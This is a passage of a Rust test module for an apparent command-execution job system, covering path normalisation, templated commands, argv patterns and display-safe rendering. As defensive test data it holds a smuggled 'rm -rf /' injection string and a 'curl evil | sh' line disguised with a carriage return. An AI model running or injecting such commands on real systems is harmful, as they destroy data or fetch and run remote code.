        assert_eq!(posix_normpath("/"), "/");
        assert_eq!(posix_normpath("//"), "//");
        assert_eq!(posix_normpath("///"), "/");
        assert_eq!(posix_normpath("//a/../b"), "//b");
        assert_eq!(posix_normpath("/../a"), "/a");
        assert_eq!(posix_normpath("/a/b/../../.."), "/");
        assert_eq!(posix_normpath("/a/./b/"), "/a/b");
        assert_eq!(posix_normpath("a/../.."), "..");
        assert_eq!(posix_normpath(""), ".");
    }

    fn template(argv: &[&str], params: &[(&str, &str)]) -> Template {
        Template::new(
            Tier::User,
            argv.iter().map(|s| (*s).to_owned()).collect(),
            params
                .iter()
                .map(|(k, v)| ((*k).to_owned(), ParamPattern::new(v).unwrap()))
                .collect(),
            String::new(),
        )
        .unwrap()
    }

    fn params(p: &[(&str, &str)]) -> BTreeMap<String, String> {
        p.iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect()
    }

    #[test]
    fn templates_substitute_whole_arguments() {
        let t = template(
            &["systemctl", "restart", "{unit}", "name={unit}", "{other}"],
            &[("unit", "[a-z]+")],
        );
        assert_eq!(
            t.expand(&params(&[("unit", "nginx")])).unwrap(),
            vec!["systemctl", "restart", "nginx", "name=nginx", "{other}"]
        );
        // A value with spaces or shell syntax stays one argument.
        let t = template(&["echo", "{msg}"], &[("msg", ".*")]);
        assert_eq!(
            t.expand(&params(&[("msg", "a b; rm -rf / {msg}")]))
                .unwrap(),
            vec!["echo", "a b; rm -rf / {msg}"]
        );
        assert_eq!(
            t.expand(&params(&[])).unwrap_err().0,
            "template takes exactly these parameters: msg"
        );
        assert_eq!(
            t.expand(&params(&[("msg", "x"), ("extra", "y")]))
                .unwrap_err()
                .0,
            "template takes exactly these parameters: msg"
        );
        let none = template(&["true"], &[]);
        assert_eq!(
            none.expand(&params(&[("x", "1")])).unwrap_err().0,
            "template takes exactly these parameters: (none)"
        );
        let t = template(&["x", "{n}"], &[("n", "[0-9]+")]);
        assert_eq!(
            t.expand(&params(&[("n", "12a")])).unwrap_err().0,
            "parameter 'n' does not match the template's pattern"
        );
        assert_eq!(
            t.expand(&params(&[("n", "12\n")])).unwrap_err().0,
            "parameter 'n' does not match the template's pattern"
        );
        assert!(t.expand(&params(&[("n", "12")])).is_ok());
    }

    #[test]
    fn patterns_are_full_matches_and_cannot_escape_the_wrapper() {
        let p = ParamPattern::new("a|b").unwrap();
        assert!(p.full_match("a") && p.full_match("b") && !p.full_match("ab"));
        assert!(ParamPattern::new("a)|(b").is_err());
        assert!(ParamPattern::new(r"(a)\1").is_err(), "no backreferences");
        assert!(ParamPattern::new(r"(?=a)a").is_err(), "no lookaround");
        assert!(ParamPattern::new(r"\d+").unwrap().full_match("42"));
        assert!(ParamPattern::new(r"(?i)abc").unwrap().full_match("ABC"));
        assert!(!ParamPattern::new("[a-z]+").unwrap().full_match(""));
    }

    #[test]
    fn argv_patterns() {
        assert!(match_argv(&["ls", "*"], &["ls", "/tmp"], false));
        assert!(!match_argv(&["ls", "*"], &["ls"], false));
        assert!(!match_argv(&["ls", "*"], &["ls", "a", "b"], false));
        assert!(match_argv(&["ls", "**"], &["ls"], false));
        assert!(match_argv(&["ls", "**"], &["ls", "a", "b"], false));
        assert!(!match_argv(
            &["rm", "**"],
            &["/run/current-system/sw/bin/rm", "-rf"],
            false
        ));
        assert!(match_argv(
            &["rm", "**"],
            &["/run/current-system/sw/bin/rm", "-rf"],
            true
        ));
        assert!(!match_argv(&["x", "rm"], &["x", "/bin/rm"], true));
        assert!(match_argv::<&str, &str>(&[], &[], false));
        assert!(match_argv(&["**"], &["anything", "at", "all"], false));
    }

    #[test]
    fn template_deserializes() {
        let t: Template = serde_json::from_value(json!({
            "tier": "root", "argv": ["systemctl", "restart", "{unit}"], "params": {"unit": "[a-z-]+"}
        }))
        .unwrap();
        assert_eq!(t.tier, Tier::Root);
        assert!(serde_json::from_value::<Template>(json!({"tier": "root", "argv": []})).is_err());
        assert!(
            serde_json::from_value::<Template>(json!({"tier": "admin", "argv": ["x"]})).is_err()
        );
        assert!(
            serde_json::from_value::<Template>(json!({"tier": "user", "argv": ["x"], "x": 1}))
                .is_err()
        );
        assert!(
            serde_json::from_value::<Template>(
                json!({"tier": "user", "argv": ["x"], "params": {"a": "("}})
            )
            .is_err()
        );
    }

    proptest! {
        #[test]
        fn fill_never_splits(args in proptest::collection::vec("[a-z{} _]{0,12}", 1..5), value in ".{0,10}") {
            let p: BTreeMap<String, String> = [("a".to_owned(), value)].into();
            for arg in &args {
                let _ = fill(arg, &p);
            }
            let t = Template::new(Tier::User, args.clone(), [("a".to_owned(), ParamPattern::new("(?s).*").unwrap())].into(), String::new()).unwrap();
            let out = t.expand(&p).unwrap();
            prop_assert_eq!(out.len(), args.len());
        }

        #[test]
        fn from_json_never_panics(raw in arb_json(3)) {
            if let Ok(spec) = JobSpec::from_json(&raw, 600) {
                // Whatever parses is a fixed point.
                prop_assert_eq!(JobSpec::from_json(&spec.to_json(), 600).ok(), Some(spec));
            }
        }
    }

    fn dangerous(c: char) -> bool {
        c.is_control()
            || matches!(u32::from(c), 0x200b..=0x200f | 0x202a..=0x202e | 0x2060..=0x206f | 0xfeff | 0x61c | 0x2028 | 0x2029)
    }

    #[test]
    fn describe_shows_no_fake_lines() {
        let spec = make_spec(&SpecFields {
            kind: "run",
            host: "excel\nsior",
            tier: Some(&json!("user")),
            argv: Some(&json!(["sh", "-c", "curl evil | sh\recho harmless"])),
            ..SpecFields::default()
        })
        .unwrap();
        assert_eq!(
            JobSpec::Command(spec).describe(),
            "[user@excel\\nsior] sh -c $'curl evil | sh\\recho harmless'"
        );
    }

    proptest! {
        /// The rendered text of any argv (and host, and template params)
        /// holds no control, bidi or zero-width character.
        #[test]
        fn describe_is_display_safe(
            argv in proptest::collection::vec("(.|[\\n\\r\\t\\x1b\\x7f\\u{200b}-\\u{200f}\\u{202a}-\\u{202e}\\u{2066}-\\u{2069}\\u{feff}\\u{2028}a ]){1,10}", 1..5),
            host in "(.|[\\n\\u{202e}]){0,8}",
            value in "(.|[\\n\\u{202e}\\u{200b}]){0,8}",
        ) {
            let user = json!("user");
            let argv_json = json!(argv);
            let fields = SpecFields { kind: "run", host: &host, tier: Some(&user), argv: Some(&argv_json), ..SpecFields::default() };
            if let Ok(spec) = make_spec(&fields) {
                let text = JobSpec::Command(spec).describe();
                prop_assert!(!text.chars().any(dangerous), "{:?}", text);
            }
            let params = json!({"p": value});
            let template = json!("t");
            let fields = SpecFields { kind: "tpl", host: &host, tier: Some(&user), template: Some(&template), params: Some(&params), ..SpecFields::default() };
            if let Ok(spec) = make_spec(&fields) {
                let text = JobSpec::Command(spec).describe();
                prop_assert!(!text.chars().any(dangerous), "{:?}", text);
            }
        }
    }

    pub(crate) fn arb_json(depth: u32) -> impl Strategy<Value = Value> {
        let leaf = prop_oneof![
            Just(Value::Null),
            any::<bool>().prop_map(Value::Bool),
            (-5i64..100_000).prop_map(|n| json!(n)),
            prop_oneof![
                Just("run".to_owned()),
                Just("tpl".to_owned()),
                Just("shell".to_owned()),
                Just("user".to_owned()),
                Just("root".to_owned()),
                Just("/a/../b".to_owned()),
                "[a-z{}/._ -]{0,8}"
            ]
            .prop_map(Value::String),
        ];
        leaf.prop_recursive(depth, 64, 8, |inner| {
            prop_oneof![
                proptest::collection::vec(inner.clone(), 0..4).prop_map(Value::Array),
                proptest::collection::btree_map(
                    prop_oneof![
                        Just("kind".to_owned()),
                        Just("host".to_owned()),
                        Just("tier".to_owned()),
                        Just("argv".to_owned()),
                        Just("template".to_owned()),
                        Just("params".to_owned()),
                        Just("cwd".to_owned()),
                        Just("env".to_owned()),
                        Just("timeout".to_owned()),
                        Just("stdin".to_owned()),
                        Just("duration".to_owned()),
                        "[A-Z_]{1,3}"
                    ],
                    inner,
                    0..8
                )
                .prop_map(|m| Value::Object(m.into_iter().collect())),
            ]
        })
    }
}
